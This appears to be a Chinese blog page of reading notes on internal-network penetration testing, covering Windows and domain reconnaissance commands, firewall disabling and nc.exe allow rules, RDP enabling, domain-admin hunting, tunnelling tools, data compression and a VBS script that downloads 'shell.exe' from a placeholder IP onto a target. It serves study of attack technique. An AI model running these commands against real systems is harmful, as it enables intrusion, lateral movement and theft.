+<h3 id="11-查询补丁列表"><a href="#11-查询补丁列表" class="headerlink" title="11.查询补丁列表"></a>11.查询补丁列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="12-查询本机共享列表"><a href="#12-查询本机共享列表" class="headerlink" title="12.查询本机共享列表"></a>12.查询本机共享列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share //wmic:wmic share get name,path,status</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="13-查询路由表及所有可用接口的ARP缓存表"><a href="#13-查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="13.查询路由表及所有可用接口的ARP缓存表"></a>13.查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route printarp -a</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="14-查询防火墙相关配置"><a href="#14-查询防火墙相关配置" class="headerlink" title="14.查询防火墙相关配置"></a>14.查询防火墙相关配置</h3><h4 id="1-关闭防火墙"><a href="#1-关闭防火墙" class="headerlink" title="1) 关闭防火墙"></a>1) 关闭防火墙</h4><p>windows server 2003之前</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Windows server 2003之后</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofile state off</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-查看防火墙配置"><a href="#2-查看防火墙配置" class="headerlink" title="2) 查看防火墙配置"></a>2) 查看防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//windows server 2003之前允许指定程序全部连接</span><br><span class="line"></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">//windows server 2003之后的版本</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">//允许指定程序退出</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">//允许3389端口放行</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4) 自定义防火墙日志的存储位置"></a>4) 自定义防火墙日志的存储位置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1-查看远程连接端口"><a href="#1-查看远程连接端口" class="headerlink" title="1) 查看远程连接端口"></a>1) 查看远程连接端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2) 在Windows server 2003中开启3389"></a>2) 在Windows server 2003中开启3389</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3) 在Windows server 2008和2012中"></a>3) 在Windows server 2008和2012中</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">//修改注册表方式</span><br><span class="line"></span><br><span class="line">reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p>
+<h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenumexecute</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询指定用户的详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all//将查看到的DNS服务器用nslookup进行解析nslookup dc.test.local</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看系统详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;登录服务器&quot;//如果结果不为&quot;WORKGROUP&quot;则主机为域主机</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询当前登录域及登录用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group workstation</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断主域</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain//命令用于查看域内时间，同时也可以查看域控制器</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan(<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a>)</p>
+<p>探测当前网段主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbt.exe 192.168.1.0/20</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用ICMP探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529211326956.png" alt="image-20210529211326956"></p>
+<p>通过ARPscan工具扫描探测内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.exe -t 192.168.1.0/20</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Empire中的ARPscan模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemode situational_awareness/network/arpscanexecute</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Nishang中的Invoke-ARPScan.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\temp\log.txttype c:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过常规的TCP/UDP端口扫描探测内网</p>
+<p>上传ScanLine进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p>
+<p>S扫描器</p>
+<p>Metasploit端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcpset ports 1-1000set RHOST 192.168.1.1set THREADS 10</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PowerSploit、NiShang的Invoke-portscan脚本</p>
+<h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net view /domain //查询域</span><br><span class="line"></span><br><span class="line">net view /domain:test //查询域内所有计算机</span><br><span class="line"></span><br><span class="line">net group /domain //查询域内所有用户组列表</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain //查询所有域成员计算机列表</span><br><span class="line"></span><br><span class="line">net accounts /domain //获取域内密码信息</span><br><span class="line"></span><br><span class="line">nltest /domain_trusts //域内信任信息</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:testnet time /domainNslookup -type=SRV _ldap._tcpnet group &quot;Domain Controllers&quot; /domainnetdom query pdc //查看主控制器</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//查询所有域用户列表</span><br><span class="line"></span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">//获取域内用户的详细信息</span><br><span class="line"></span><br><span class="line">wmic useraccount get /all</span><br><span class="line"></span><br><span class="line">//查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在</span><br><span class="line"></span><br><span class="line">dsquery user</span><br><span class="line"></span><br><span class="line">//查找目录中的计算机</span><br><span class="line"></span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">//查询本地管理员组用户</span><br><span class="line"></span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line">//查询域管理员用户组</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line">//查询管理员用户组</span><br><span class="line"></span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统/主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p>
+<h3 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h3><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\dc2012</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580439953824.png" alt="1580439953824"></p>
+<h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p>
+<p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：<a target="_blank" rel="noopener" href="https://www.cr173.com/soft/921507.html">https://www.cr173.com/soft/921507.html</a></p>
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580441837968.png" alt="1580441837968"></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580441964422.png" alt="1580441964422"></p>
+<h3 id="NetView"><a href="#NetView" class="headerlink" title="NetView"></a>NetView</h3><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p>
+<h3 id="Netness"><a href="#Netness" class="headerlink" title="Netness"></a>Netness</h3><p>下载地址没找到</p>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>使用Powerview的Invoke-UserHunter。</p>
+<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中也存在此类型的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/user_hunterexecute</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Nmap的NSE脚本"><a href="#Nmap的NSE脚本" class="headerlink" title="Nmap的NSE脚本"></a>Nmap的NSE脚本</h3><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p>
+<p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p>
+<p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p>
+<p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p>
+<h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><p>其中阿里云上有个链接也说到了类似的方法：<a target="_blank" rel="noopener" href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p>
+<p>本机检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//获取域管理员列表</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line"></span><br><span class="line">//列出本机的所有进程和进程用户</span><br><span class="line"></span><br><span class="line">tasklist /v</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询域控的域用户会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//查询域控列表</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br><span class="line"></span><br><span class="line">//收集所有活动域的会话列表</span><br><span class="line"></span><br><span class="line">netsess -h</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="第三章-隐藏通信隧道技术"><a href="#第三章-隐藏通信隧道技术" class="headerlink" title="第三章 隐藏通信隧道技术"></a>第三章 隐藏通信隧道技术</h1><h2 id="3-1-常用隧道"><a href="#3-1-常用隧道" class="headerlink" title="3.1 常用隧道"></a>3.1 常用隧道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">网络层：</span><br><span class="line">IPv6隧道</span><br><span class="line">ICMP隧道</span><br><span class="line">GRE隧道</span><br><span class="line"></span><br><span class="line">传输层：</span><br><span class="line">TCP隧道</span><br><span class="line">UDP隧道</span><br><span class="line">常规端口转发</span><br><span class="line"></span><br><span class="line">应用层：</span><br><span class="line">SSH隧道</span><br><span class="line">HTTP隧道</span><br><span class="line">HTTPS隧道</span><br><span class="line">DNS隧道</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">nc -zv 192.168.1.10 80</span><br><span class="line"></span><br><span class="line">curl www.baidu.com:80</span><br><span class="line"></span><br><span class="line">//curl的代理模式</span><br><span class="line"></span><br><span class="line">curl -x proxy-ip:port www.baidu.com</span><br><span class="line"></span><br><span class="line">//windows下的nslookup</span><br><span class="line"></span><br><span class="line">mslookup www.baidu.com vps-ip</span><br><span class="line"></span><br><span class="line">//linux下的dig</span><br><span class="line"></span><br><span class="line">dig @vps-ip www.baidu.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-2-网络层隧道技术"><a href="#3-2-网络层隧道技术" class="headerlink" title="3.2 网络层隧道技术"></a>3.2 网络层隧道技术</h2><h3 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h3><p>几种IPv6工具：socat、6tunnel、nt6tunnel</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><p><a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p>
+<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<h2 id="3-3-传输层隧道技术"><a href="#3-3-传输层隧道技术" class="headerlink" title="3.3 传输层隧道技术"></a>3.3 传输层隧道技术</h2><p>lcx</p>
+<p>nc</p>
+<p>powercat</p>
+<h2 id="3-4-应用层隧道技术"><a href="#3-4-应用层隧道技术" class="headerlink" title="3.4 应用层隧道技术"></a>3.4 应用层隧道技术</h2><p>SSH协议</p>
+<p>DNS协议</p>
+<p>dnscat2</p>
+<h2 id="3-5-SOCKS代理"><a href="#3-5-SOCKS代理" class="headerlink" title="3.5 SOCKS代理"></a>3.5 SOCKS代理</h2><p>earthworm</p>
+<p>reGeorg</p>
+<p>sSocks</p>
+<p>SocksCap64</p>
+<p>Proxifier</p>
+<p>ProxyChains</p>
+<h2 id="3-6-压缩数据"><a href="#3-6-压缩数据" class="headerlink" title="3.6 压缩数据"></a>3.6 压缩数据</h2><h3 id="rar-exe"><a href="#rar-exe" class="headerlink" title="rar.exe"></a>rar.exe</h3><p>将E:\webs\目录下的所有内容打包为1.rar放入E:\webs\目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a -k -r -s -m3 E:\webs\1.rar E:\webs\</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将E:\webs\1.rar解压到当前根目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe e E:\webs\1.rar</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>分卷压缩、解压</strong></p>
+<p>分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a -m0 -r -v20m E:\test.rar E:\API</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将E:\test.part01.rar解压到E盘的x1目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe x E:\test.part01.rar E:\x1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="7-Zip"><a href="#7-Zip" class="headerlink" title="7-Zip"></a>7-Zip</h3><h2 id="3-7-上传和下载"><a href="#3-7-上传和下载" class="headerlink" title="3.7 上传和下载"></a>3.7 上传和下载</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><p>download.vbs代码：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post=<span class="built_in">CreateObject</span>(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://IP/shell.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\shell.exe&quot;</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行下面命令即可在目标主机上下载shell.exe文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cscript download.vbs</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用Debug"><a href="#利用Debug" class="headerlink" title="利用Debug"></a>利用Debug</h3><h3 id="利用Nishang上传"><a href="#利用Nishang上传" class="headerlink" title="利用Nishang上传"></a>利用Nishang上传</h3><h3 id="利用bitsadmin下载"><a href="#利用bitsadmin下载" class="headerlink" title="利用bitsadmin下载"></a>利用bitsadmin下载</h3><h1 id="第四章-权限提升分析及防御"><a href="#第四章-权限提升分析及防御" class="headerlink" title="第四章 权限提升分析及防御"></a>第四章 权限提升分析及防御</h1><p>这里提到了一个TrustedInstaller权限，Windows的最高权限。System无法修改系统文件，但是这个权限能够进行修改。</p>
+<p>提权类型：</p>
+<p>横向提权、纵向提权</p>
+<h2 id="4-1-系统内核溢出漏洞提权分析及防范"><a href="#4-1-系统内核溢出漏洞提权分析及防范" class="headerlink" title="4.1 系统内核溢出漏洞提权分析及防范"></a>4.1 系统内核溢出漏洞提权分析及防范</h2><h3 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//查看当前权限</span><br><span class="line"></span><br><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个链接里也描述了一些方法和工具：</p>
+<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/">https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/</a></p>
